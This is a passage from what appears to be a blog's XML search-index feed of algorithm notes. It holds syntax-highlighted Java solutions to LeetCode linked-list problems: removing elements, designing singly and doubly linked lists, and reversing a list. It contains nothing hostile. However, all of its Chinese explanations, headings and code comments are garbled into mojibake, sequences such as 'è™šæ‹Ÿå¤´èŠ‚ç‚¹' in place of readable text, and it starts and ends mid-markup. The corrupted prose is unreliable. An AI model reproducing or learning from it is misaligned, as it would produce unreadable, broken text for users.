class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeElements</span><span class="params">(ListNode head, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span>(head == <span class="literal">null</span>)&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head.next;</span><br><span class="line"><span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> head;</span><br><span class="line"><span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(cur.val == val)&#123;</span><br><span class="line">  prev.next = cur.next;</span><br><span class="line">  cur = cur.next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"> prev = cur;</span><br><span class="line"> cur = cur.next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(head.val == val)&#123;</span><br><span class="line">head = head.next;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">return</span> head;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="è™šæ‹Ÿå¤´èŠ‚ç‚¹"><a href="#è™šæ‹Ÿå¤´èŠ‚ç‚¹" class="headerlink" title="è™šæ‹Ÿå¤´èŠ‚ç‚¹"></a>è™šæ‹Ÿå¤´èŠ‚ç‚¹</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeElements</span><span class="params">(ListNode head, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">            <span class="comment">//åªæœ‰å¤´èŠ‚ç‚¹</span></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//åˆ›å»ºè™šæ‹Ÿå¤´èŠ‚ç‚¹ ä¸ç”¨å†åˆ é™¤å¤´èŠ‚ç‚¹</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>,head);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> dummyNode;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(prev != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(prev.val == val) &#123;</span><br><span class="line">                cur.next = prev.next;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                cur = prev;</span><br><span class="line">            &#125;</span><br><span class="line">            prev = prev.next;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">return</span> dummyNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è®¾è®¡é“¾è¡¨"><a href="#è®¾è®¡é“¾è¡¨" class="headerlink" title="è®¾è®¡é“¾è¡¨"></a>è®¾è®¡é“¾è¡¨</h4><p>linkï¼š<a href="https://leetcode.cn/problems/design-linked-list/">707. è®¾è®¡é“¾è¡¨ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><p>ç»¼åˆç»ƒä¹ é“¾è¡¨äº”å¤§æ“ä½œçš„å¥½é¢˜ç›®ï¼<br>1.è·å–é“¾è¡¨çš„indexä¸‹æ ‡èŠ‚ç‚¹æ•°å€¼.<br>2.åœ¨é“¾è¡¨æœ€å‰é¢æ’å…¥èŠ‚ç‚¹.<br>3.åœ¨é“¾è¡¨æœ€åæ’å…¥èŠ‚ç‚¹.<br>4.åœ¨é“¾è¡¨ç¬¬indexä¸ªèŠ‚ç‚¹å‰æ’å…¥èŠ‚ç‚¹.<br>5.åˆ é™¤é“¾è¡¨ç¬¬indexä¸ªèŠ‚ç‚¹. </p><h5 id="æ€è·¯åˆ†æ-1"><a href="#æ€è·¯åˆ†æ-1" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>å…ˆä»é“¾è¡¨éœ€è¦çš„å…ƒç´ å…¥æ‰‹ï¼Œheadï¼Œtailï¼Œsize.<br>è€ƒè™‘è™šæ‹Ÿå¤´èŠ‚ç‚¹.ã€ä¼˜å…ˆè€ƒè™‘ç‰¹æ®Šæƒ…å†µã€‘<br>ä¸ªäººè§‰å¾—å¯¹äºå•é“¾è¡¨æ›´å®¹æ˜“æ“ä½œ.(å¥½å§å…¶å®å°±æ˜¯ä¸€ä¸ªæ‡’è›‹ğŸ˜‚)</p><h6 id="å•é“¾è¡¨"><a href="#å•é“¾è¡¨" class="headerlink" title="å•é“¾è¡¨"></a>å•é“¾è¡¨</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="comment">//å®šä¹‰éœ€è¦çš„ç»“æ„</span></span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode next;</span><br><span class="line">    ListNode(<span class="type">int</span> val) &#123;</span><br><span class="line">    <span class="built_in">this</span>.val = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span> &#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="type">int</span> <span class="variable">size</span>  <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="comment">//å¦‚æœindexä¸åœ¨èŒƒå›´è¿”å›-1</span></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">//è™šæ‹Ÿå¤´èŠ‚ç‚¹çš„å­˜åœ¨ ä½¿å¾—è¿”å›index+1ä¸ªèŠ‚ç‚¹&quot;=&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= index; i++) &#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur.val;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//å¦‚æœindexç­‰äº0 æ–°æ’å…¥çš„èŠ‚ç‚¹å°±ä¸ºå¤´èŠ‚ç‚¹</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtHead</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        addAtIndex(<span class="number">0</span>,val);</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="comment">//å¦‚æœindexç­‰äºé“¾è¡¨é•¿åº¦ æ­¤æ—¶æ’å…¥çš„æ–°èŠ‚ç‚¹ä¸ºå°¾èŠ‚ç‚¹</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtTail</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        addAtIndex(size,val);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">    <span class="comment">//å¦‚æœindexå¤§äºé“¾è¡¨é•¿åº¦ è¿”å›null</span></span><br><span class="line">         <span class="keyword">if</span>(index &gt; size) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span>(index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            index = <span class="number">0</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         size++;</span><br><span class="line">         <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> head;</span><br><span class="line">         <span class="comment">//æ‰¾åˆ°è¦æ’å…¥èŠ‚ç‚¹çš„å‰é©±</span></span><br><span class="line">         <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index ;i++) &#123;</span><br><span class="line">            prev = prev.next;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">toAdd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        toAdd.next = prev.next;</span><br><span class="line">        prev.next = toAdd;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">     <span class="comment">//åŒæ ·çš„åˆ¤æ–­é€»è¾‘</span></span><br><span class="line">     <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     size--;</span><br><span class="line">     <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> head;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">        prev = prev.next;</span><br><span class="line">     &#125;</span><br><span class="line">     prev.next = prev.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="åŒé“¾è¡¨"><a href="#åŒé“¾è¡¨" class="headerlink" title="åŒé“¾è¡¨"></a>åŒé“¾è¡¨</h6><p>ç”¨åŒé“¾è¡¨æ“ä½œæ—¶éœ€è¦æ³¨æ„æŒ‡é’ˆæ“ä½œçš„é€»è¾‘.<br>head.next &#x3D; tail;<br>tail.next &#x3D; head;<br><strong><code>index &lt; (size - 1) / 2</code> åˆ¤æ–­ç”¨æ¥å†³å®šæ˜¯ä»å¤´èŠ‚ç‚¹è¿˜æ˜¯å°¾èŠ‚ç‚¹è¿›è¡Œéå†ï¼Œè¿™æ ·åšæ˜¯ä¸ºäº†æé«˜æŸ¥æ‰¾æ•ˆç‡</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        ListNode next,prev;</span><br><span class="line">        ListNode(<span class="type">int</span> x) &#123;val = x;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head,tail;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span> &#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        tail = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        head.next = tail;</span><br><span class="line">        tail.prev = head;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)&#123;<span class="keyword">return</span> -<span class="number">1</span>;&#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é€šè¿‡åˆ¤æ–­ index &lt; (size - 1) / 2 æ¥å†³å®šæ˜¯ä»å¤´ç»“ç‚¹è¿˜æ˜¯å°¾èŠ‚ç‚¹éå†ï¼Œæé«˜æ•ˆç‡</span></span><br><span class="line">        <span class="keyword">if</span>(index &lt; (size - <span class="number">1</span>) / <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= index; i++)&#123;</span><br><span class="line">                cur = cur.next;</span><br><span class="line">            &#125;            </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            cur = tail;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= size - index - <span class="number">1</span>; i++)&#123;</span><br><span class="line">                cur = cur.prev;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur.val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtHead</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        newNode.next = cur.next;</span><br><span class="line">        cur.next.prev = newNode;</span><br><span class="line">        cur.next = newNode;</span><br><span class="line">        newNode.prev = cur;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtTail</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> tail;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        newNode.next = tail;</span><br><span class="line">        newNode.prev = cur.prev;</span><br><span class="line">        cur.prev.next = newNode;</span><br><span class="line">        cur.prev = newNode;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; size)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span>)&#123;index = <span class="number">0</span>;&#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++)&#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        newNode.next = cur.next;</span><br><span class="line">        cur.next.prev = newNode;</span><br><span class="line">        newNode.prev = cur;</span><br><span class="line">        cur.next = newNode;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt;= size || index &lt; <span class="number">0</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++)&#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        cur.next.next.prev = cur;</span><br><span class="line">        cur.next = cur.next.next;</span><br><span class="line">        size--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yubã®Algorithm.0x5</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0x5/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0x5/</url>
      
        <content type="html"><![CDATA[<h4 id="åè½¬é“¾è¡¨"><a href="#åè½¬é“¾è¡¨" class="headerlink" title="åè½¬é“¾è¡¨"></a>åè½¬é“¾è¡¨</h4><p>linkï¼š<a href="https://leetcode.cn/problems/reverse-linked-list/">206. åè½¬é“¾è¡¨ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>ä¸æ•°ç»„ä¸åŒï¼Œé“¾è¡¨æ²¡å¿…è¦å®šä¹‰æ–°çš„é“¾è¡¨è¿›è¡Œå­˜å‚¨ã€å¯¹å†…å­˜ç©ºé—´çš„æµªè´¹ã€‘<br>ç›´æ¥æ”¹å˜nextæŒ‡é’ˆå³å¯.<br><strong>æ³¨æ„å¤´èŠ‚ç‚¹æŒ‡å‘çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ä¸ºnull</strong></p><h6 id="åŒæŒ‡é’ˆæ³•"><a href="#åŒæŒ‡é’ˆæ³•" class="headerlink" title="åŒæŒ‡é’ˆæ³•"></a>åŒæŒ‡é’ˆæ³•</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="comment">//åŒæŒ‡é’ˆæ“ä½œ </span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">//è®°å½•èŠ‚ç‚¹</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span>) &#123;</span><br><span class="line">            temp = cur.next;<span class="comment">//ä¿å­˜ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">            cur.next = prev;</span><br><span class="line">            <span class="comment">//èµ‹å€¼ä¹‹åæ•´ä½“å‘åç§»åŠ¨</span></span><br><span class="line"><span class="comment">//æ³¨æ„å…ˆç§»åŠ¨prev ä¸å¦‚curå·²ç»ç§»åŠ¨åè®°å½•ä¸åˆ°prevæ–°çš„ä½ç½®</span></span><br><span class="line">            prev = cur;</span><br><span class="line">            cur = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="é€’å½’æ³•"><a href="#é€’å½’æ³•" class="headerlink" title="é€’å½’æ³•"></a>é€’å½’æ³•</h6><p>å’ŒåŒæŒ‡é’ˆæ³•æ˜¯ä¸€æ ·çš„é€»è¾‘ã€å‡åç‰ˆã€‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">      <span class="comment">//prev -&gt; null åˆå§‹åŒ– headåè½¬çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ å¯åŠ¨åè½¬æ“ä½œ</span></span><br><span class="line">        <span class="keyword">return</span> reverse(<span class="literal">null</span>, head);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> ListNode <span class="title function_">reverse</span><span class="params">(ListNode prev, ListNode cur)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> prev;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        temp = cur.next;</span><br><span class="line">        cur.next = prev;</span><br><span class="line">        <span class="comment">//æ›´æ–°prevå’Œcurçš„ä½ç½®</span></span><br><span class="line">        <span class="keyword">return</span> reverse(cur,temp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä»åå‘å‰é€’å½’</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>&#123;</span><br><span class="line">    ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="comment">//è¾¹ç¼˜æ¡ä»¶åˆ¤æ–­</span></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(head.next == <span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//é€’å½’è°ƒç”¨ ç¿»è½¬å¤´èŠ‚ç‚¹ä¹‹åçš„é“¾è¡¨</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">last</span> <span class="operator">=</span> reverseList(head.next);</span><br><span class="line">        <span class="comment">//ç¿»è½¬å¤´èŠ‚ç‚¹ä¹‹åé“¾è¡¨çš„æŒ‡å‘</span></span><br><span class="line">        head.next.next = head;</span><br><span class="line">        <span class="comment">//æ­¤æ—¶çš„headèŠ‚ç‚¹ä¸ºå°¾èŠ‚ç‚¹, nextéœ€è¦æŒ‡å‘null</span></span><br><span class="line">        head.next = <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹"><a href="#ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹" class="headerlink" title="ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹"></a>ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹</h5><p>linkï¼š<a 